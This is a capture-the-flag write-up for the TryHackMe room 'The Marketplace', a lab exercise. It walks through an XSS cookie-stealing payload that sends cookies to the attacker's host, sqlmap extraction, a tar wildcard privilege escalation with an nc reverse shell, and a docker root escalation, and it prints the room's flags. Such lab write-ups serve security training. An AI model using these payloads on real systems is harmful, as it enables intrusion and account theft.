---
title: TryHackMe The Marketplace Writeup
date: 2023-07-05T13:34:41.636Z
description: My solution for the TryHackMe Room "The marketplace"
---
T﻿his room is rated at medium difficulty and covers some interesting topics such as XSS (cross-site scripting), SQL Injection, and a couple of methods for privilege escalation. For me, the victim machine is at address `10.10.15.67`

## R﻿econnaissance

S﻿tarting with an `nmap`scan to find running services and open ports.

```shell
$ nmap -sV 10.10.15.67
```

```
Nmap scan report for ip-10-10-15-67.eu-west-1.compute.internal (10.10.15.67)
Host is up (0.00038s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.19.2
32768/tcp open  http    Node.js (Express middleware)
...
```

F﻿rom this we can see that there is a web server running on the machine, as well and an OpenSSH instance. Let's start by taking a look at the web page .by navigating to `http://10.10.15.67` in a browser

![](/img/webpage.png)

T﻿he website seems to be some sort of online marketplace (surprise, surprise). Poking around on the website uncovers the ability to log in or sign up to create an account. After signing up and logging in, there were some new options available to me: the ability to create a listing, and to view messages for my account. As well as this, there was a session cookie created with the name `token`. These session cookies are used by the browser in order to tell what user is logged in, in order to show them the correct content on the page.

I﻿f we can somehow replace our own session token with one of an administrator or high-level user, we will likely be able to have some administrative options which may help us obtain a reverse shell on the machine. Let's try creating a listing. On the listing creation page, there is a simple form to input the title and content of the listing, we can try testing for XSS vulnerabilities by attempting to embed a textarea element into the page (in the content field). When we then view the listing, and a textarea field is present, we know that the site is vulnerable to XSS injection. 

![](/img/textarea.png)

![](/img/textareaworking.png)

W﻿ith an XSS vulnerability present, we can create a malicious listing that will steal the user's cookie and send it to our web server (which we will set up shortly). When we use the "report listing to administrator" function on the website, the THM machine will automatically mimic an administrator navigating to the listing. With this, we will be able to steal their cookie.

F﻿irst, the cookie stealing payload:

> `<script>fetch('http://<YOUR_MACHINE_IP>:8000/steal?cookie='+btoa(document.cookie));</script>`

T﻿hen, the setup of the web server using python:

```shell
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

N﻿ow, let's submit the listing, and report it to the administrators.

![](/img/listing.png)

![](/img/reported.png)

I﻿f we look in our web server console, sure enough we got the cookie! We will need to base64 decode the cookie into order to get the administrator's token.

![](/img/gotcookie.png)

W﻿e can replace our token cookie with the administrator token by using any firefox or chrome "cookie editor" extension, and then reload the page.

U﻿pon reloading the page, we are presented with another navbar link: "administration panel", which gives us a list of all of the current users in the application. We can click on these links and go to each individual user page, notice the URL parameters when fetching a user:

> **`h﻿ttp://10.10.15.67/admin?user=1`**

T﻿he URL parameters are likely being used to query an SQL database and retrieve information about the user with the corresponding ID passed within the URL. After some playing around, I managed to get the application to give a MySQL syntax error, meaning that an SQL injection is present. Time for SQLMap!

I﻿ won't dive into the details of the SQLMap tool in this writeup, as there are plenty of resources online. One thing to note is that you need to make sure you pass the cookie value to the tool when using it. Also ensure to use the delay argument, as not having it there meant that it didn't work (for me, at least).

```shell
$ sqlmap -u "http://10.10.15.67/admin?user=3" \
         --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2ODg1NjY3MTN9.6zpkfouKBuG5s17Dp_NVWbWDepJpe4cUGc22qzjM63U' \
         --delay=3 \
         --technique=U \
         --dump
```

I﻿ have ommitted most output of the command, but the command dumped 3 database tables, one which contains all listing, one which contained username and password hashes (I tried to crack them with brute force, but they are salted with bcrypt), and other called "`messages`", which contained the following bit of vital information:

```
Hello!\r\nAn automated system has detected your SSH password is too weak
and needs to be changed. You have been generated a new temporary password.
\r\nYour new password is: @b_ENXkGYUCAv3zJ 
```

T﻿his message was sent to user with id `3`, which we can lookup in the users table and find out that it belongs to the user `jake`

Let's now log in as Jake via SSH and get the user flag. Typing `sudo -l` will tell us what programs we can run and as what users - this is a good command to memorize for privilege escalation

```shell
ssh jake@10.10.15.67
jake@10.10.15.67 s password: @b_ENXkGYUCAv3zJ 
jake@10.10.15.57$ cat user.txt
THM{c3648ee7af1369676e3e4b15da6dc0b4}
jake@10.10.15.67$ sudo -l
...
User jake may run the following commands on the-marketplace
  (michael) NOPASSWD: /opt/backups/backup.sh
```

 This tells us that our user (jake) can run the bash script at `/opt/backups/backup.sh` as the user `michael`

Let's take a look at the bash script:

```shell
jake@10.10.15.67:/opt/backups$ cat backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

The script takes a backup of everything in the /opt/backup directory by using wildcard packing, after research online I found that this can be exploited ([reference](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)). It works by creating empty files in the backup directory which are actually named the same as command arguments for the `tar `command. For a full explanation of the exploit, read the reference, but below are the commands used.

```shell
jake@10.10.15.67$ cat > /opt/backups/rev.sh << EOF
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <YOUR_IP> 5555 >/tmp/f
EOF
jake@10.10.15.67$ chmod 777 /opt/backups/rev.sh
jake@10.10.15.67$ echo "" > "/opt/backups/--checkpoint=1"
jake@10.10.15.67$ echo "" > "/opt/backups/--checkpoint-action=exec=sh rev.sh"
jake@10.10.15.67$ cd /opt/backups; sudo -u michael /opt/backups/backup.sh

```

Note: you will need to start a shell listener using `nc -lvp 5555`

Now, in your shell, you should get a callback

```shell
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 5555
listening on [any] 5555
connect to [10.10.15.67] from (UNKNOWN) [<YOUR_IP>] 53896
michael@10.10.15.67:/opt/backups$ whoami
michael
michael@10.10.15.67:/opt/backups$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)

```

From the `id `command, we can see michael is part of the docker group, let's look at GTFOBins for a docker root escalation. ([GTFOBins](https://gtfobins.github.io/gtfobins/docker/))

A good thing to always do when you have a 'crappy' shell over netcat is to upgrade it (make interactive). In fact, the docker exploit will not work if the input device is not a TTY. Commands to upgrade the shell are as follows:

```shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
# CTRL + Z
$ stty raw -echo; fg
# ENTER
export TERM=xterm-256color
```

GTFObins gives us the following command: 

```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Let's run that, and we get a root shell!

```
michael@the-marketplace$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
...
# whoami
root
# cat /root/root.txt
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```

Kind of an easy win for the root flag, I would have liked something more challenging but we will take it!